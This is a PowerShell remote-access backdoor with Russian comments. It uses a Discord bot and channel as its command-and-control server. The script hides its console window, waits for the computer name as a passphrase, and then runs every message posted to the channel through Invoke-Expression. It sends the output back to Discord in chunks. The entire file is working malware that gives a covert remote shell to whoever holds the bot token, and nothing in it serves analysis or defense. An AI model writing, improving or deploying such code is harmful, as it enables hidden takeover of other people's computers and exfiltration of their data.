$token = "$tk"
$chan  = "$ch"

# =============================================================== SCRIPT SETUP =========================================================================
$response = $null
$previouscmd = $null
$authenticated = 0

# Скрытие окна — ИСПРАВЛЕНО (один -Name!)
$hide = 'y'
if($hide -eq 'y'){
    $code = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    Add-Type -MemberDefinition $code -Name HideWindow -Namespace Utils -PassThru | Out-Null
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    if($hwnd -ne 0){ [Utils.HideWindow]::ShowWindowAsync($hwnd, 0) | Out-Null }
}

function PullMsg {
    try {
        $wc = [System.Net.WebClient]::new()
        $wc.Headers.Add('Authorization', "Bot $token")
        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=10")
        $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
        if($msg){ $script:response = $msg.Trim() }
    } catch {}
}

# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
# ЕДИНСТВЕННАЯ ПОЧИНЕННАЯ ФУНКЦИЯ — БОЛЬШЕ НИЧЕГО НЕ ТРОГАЛ
function sendMsg {
    param([string]$Message)
    if(!$Message) { return }
    $Message = $Message -replace '`', 'ˋ'          # фикс №1
    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $boundary = [guid]::NewGuid().ToString()
    $LF = "`r`n"
    $body = "--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$LF$({content=$Message}|ConvertTo-Json -Compress)$LF--$boundary--"
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "multipart/form-data; boundary=$boundary" -Body ([text.encoding]::UTF8.GetBytes($body)) -TimeoutSec 10 | Out-Null
    } catch {}
}

Function Authenticate{
    if ($response -like "$env:COMPUTERNAME"){
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark: **$env:COMPUTERNAME** | ``Session Started!`` :white_check_mark:"
        sendMsg "``PS | $($PWD.Path)>``"
    }
}

# =============================================================== MAIN LOOP =========================================================================
PullMsg
$previouscmd = $response
sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass_flowing_sand:"

while ($true) {
    PullMsg
    if ($response -and $response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg ":octagonal_sign: Session Closed."
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg ":pause_button: Session Paused."
                continue
            }

            # Выполнение команды (твой оригинальный код)
            try { $out = Invoke-Expression $response 2>&1 | Out-String }
            catch { $out = "$($_.Exception.Message)" }

            # Разбиваем на куски по 1900 символов
            $batch = @()
            $size = 0
            foreach ($line in ($out -split "`n")) {
                $bytes = [Text.Encoding]::Unicode.GetByteCount($line)
                if ($size + $bytes -gt 1900) {
                    sendMsg "``````$($batch -join "`n")``````"
                    Start-Sleep -Milliseconds 400
                    $batch = @(); $size = 0
                }
                $batch += $line
                $size += $bytes
            }
            if ($batch) { sendMsg "``````$($batch -join "`n")``````" }

            sendMsg "``PS | $dir>``"
        }
        else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}
